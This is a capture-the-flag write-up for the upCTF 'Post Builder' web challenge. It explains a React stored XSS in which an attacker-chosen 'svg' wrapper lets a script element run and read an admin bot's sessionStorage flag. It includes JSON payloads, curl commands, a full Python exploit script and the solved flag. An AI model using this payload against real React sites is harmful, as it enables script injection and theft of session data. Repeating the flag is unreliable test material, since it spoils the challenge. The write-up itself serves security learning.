# CTF Writeup — Post Builder (500 pts)
**Event:** upCTF  
**Category:** Web  
**Difficulty:** Hard  
**Flag:** `upCTF{r34ct_js_1s_still_j4v4scr1pt-bGnUtnFu47f0b021}`  
**Solves:** 1 (first blood)

---

## Challenge Description

> A modern web application for creating and sharing posts with custom layouts.

We are given a zip with full source code and an instance at `http://46.225.117.62:30021`.

---

## Stack

| Component | Technology |
|---|---|
| Frontend | React (CRA, dev mode) |
| Backend | Flask + SQLite |
| Bot | Selenium + Chrome headless |
| Proxy | Nginx |

---

## Reconnaissance

### Architecture

```
User → Nginx(:80) → Flask(:5001) / React(:3000)
                  → Bot(:8000) [internal only]
```

### Bot Behaviour (`bot.py`)

```python
WEB_URL = "http://127.0.0.1"   # internal hostname

driver.get(f'{WEB_URL}/login')
driver.execute_script(f'''
    fetch('/api/auth/login', {{...}}).then(() => {{
        sessionStorage.setItem('adminFlag', '{FLAG}');   // ← flag stored here
        window.location.href = '{url}';                  // ← navigates to our post
    }});
''')
time.sleep(6)  # bot lives for 6 seconds total
```

Key observations:
- Bot logs in on `127.0.0.1` origin → sets `sessionStorage.adminFlag` on that origin
- Bot then navigates to our post URL on the **same** `127.0.0.1` origin
- `sessionStorage` is accessible from our XSS payload ✓

### Vulnerable Component — `Element.js`

```javascript
function Element({ config }) {
  const { wrapper = 'div', children = [] } = config;
  return React.createElement(
    wrapper,         // ← attacker-controlled tag name
    null,            // ← props always null
    ...renderChildren(children)
  );
}
```

`wrapper` is passed directly to `React.createElement` as the tag name with no sanitisation.

### Post API

```
POST /api/posts    → creates post with arbitrary layout JSON
POST /api/report   → triggers bot to visit the post
GET  /api/posts/:id → public, no auth required
```

---

## Vulnerability Analysis

### What Doesn't Work

| Vector | Reason |
|---|---|
| `wrapper: "script"` with JS in children | React renders children as `textContent` — not executed |
| `dangerouslySetInnerHTML` extra key | Props hardcoded as `null` — extra keys ignored |
| `onerror`/`src` as extra keys | Same — props is `null` |
| `iframe` with `javascript:` src | Props `null` — `src` attribute never set |

### What Works — SVG Namespace Escape

```json
{
  "wrapper": "svg",
  "children": [{
    "wrapper": "script",
    "children": ["alert(1)"]
  }]
}
```

React calls `document.createElement('svg')` which switches to the **SVG namespace**. In SVG namespace, `<script>` children are **executed by the browser** — this is a known React XSS vector.

Text children inside SVG scripts are rendered as `textContent` directly, which the SVG parser executes as JavaScript.

---

## Exploit Chain

### Step 1 — Confirm XSS + Identify Origin

```json
{
  "wrapper": "svg",
  "children": [{
    "wrapper": "script",
    "children": ["fetch('/api/auth/register',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'svgworks',email:location.hostname+'@x.com',password:'test123'})})"]
  }]
}
```

Result: user `svgworks` created with `email: "127.0.0.1@x.com"` → **confirmed `127.0.0.1` origin, confirmed XSS executes**.

### Step 2 — Exfiltrate Flag via Register API

Since the bot visits on `127.0.0.1` (same origin as where `sessionStorage` was set), we can read `adminFlag` directly. We exfiltrate it by registering a new user with the flag as the email — no external server needed.

```json
{
  "title": "flag",
  "layout": [{
    "wrapper": "svg",
    "children": [{
      "wrapper": "script",
      "children": ["(function poll(){var f=sessionStorage.getItem('adminFlag');if(f){fetch('/api/auth/register',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'gotflag',email:f+'@x.com',password:'test123'})});}else{setTimeout(poll,100);}})();"]
    }]
  }]
}
```

**Why polling:** The bot sets `sessionStorage` in a `fetch().then()` callback, then navigates. There is a small race window — polling every 100ms ensures we catch the flag as soon as it's set.

### Step 3 — Trigger Bot + Read Flag

```bash
# Create post
curl -s -c x.txt -b x.txt -X POST http://TARGET/api/posts \
  -H "Content-Type: application/json" \
  -d @/tmp/flag.json

# Report to bot
curl -s -c x.txt -b x.txt -X POST http://TARGET/api/report \
  -H "Content-Type: application/json" \
  -d '{"postId":"<id>"}'

# Read flag from email field
sleep 20
curl -s -c f.txt -b f.txt -X POST http://TARGET/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"gotflag","password":"test123"}'
curl -s -c f.txt -b f.txt http://TARGET/api/auth/me
```

### Result

```json
{
  "user": {
    "email": "upCTF{r34ct_js_1s_still_j4v4scr1pt-bGnUtnFu47f0b021}@x.com",
    "username": "gotflag"
  }
}
```

---

## Full Exploit Script

```python
import requests
import json
import time

TARGET = "http://46.225.117.62:30021"
s = requests.Session()

# Register attacker account
s.post(f"{TARGET}/api/auth/register", json={
    "username": "attacker",
    "email": "a@a.com",
    "password": "pwner123"
})

# Build payload
payload = {
    "title": "xss",
    "layout": [{
        "wrapper": "svg",
        "children": [{
            "wrapper": "script",
            "children": [
                "(function poll(){"
                "var f=sessionStorage.getItem('adminFlag');"
                "if(f){"
                "fetch('/api/auth/register',{"
                "method:'POST',"
                "headers:{'Content-Type':'application/json'},"
                "body:JSON.stringify({username:'gotflag',email:f+'@x.com',password:'test123'})"
                "});"
                "}else{setTimeout(poll,100);}"
                "})();"
            ]
        }]
    }]
}

# Create post
r = s.post(f"{TARGET}/api/posts", json=payload)
post_id = r.json()["id"]
print(f"[+] Post created: {post_id}")

# Trigger bot
s.post(f"{TARGET}/api/report", json={"postId": post_id})
print("[+] Bot triggered, waiting...")

# Wait and read flag
time.sleep(20)
s2 = requests.Session()
s2.post(f"{TARGET}/api/auth/login", json={"username": "gotflag", "password": "test123"})
r = s2.get(f"{TARGET}/api/auth/me")
email = r.json()["user"]["email"]
flag = email.replace("@x.com", "")
print(f"[+] FLAG: {flag}")
```

---

## Key Takeaways

1. **React is still JavaScript** — `React.createElement('svg')` switches DOM namespace, enabling SVG `<script>` execution even in React apps that "sanitize" user input.

2. **`createElement(tag, null, ...children)`** — React's null props means no attribute injection, but the tag name itself is the vulnerability.

3. **sessionStorage origin** — Always verify which origin the bot uses. Here, bot accessed `127.0.0.1` (internal), not the external port, making sessionStorage readable from our XSS.

4. **No external server needed** — Using the app's own `/api/auth/register` as a write primitive to exfiltrate data is a clean self-contained approach for CTFs without external egress.

---

## Flag

```
upCTF{r34ct_js_1s_still_j4v4scr1pt-bGnUtnFu47f0b021}
```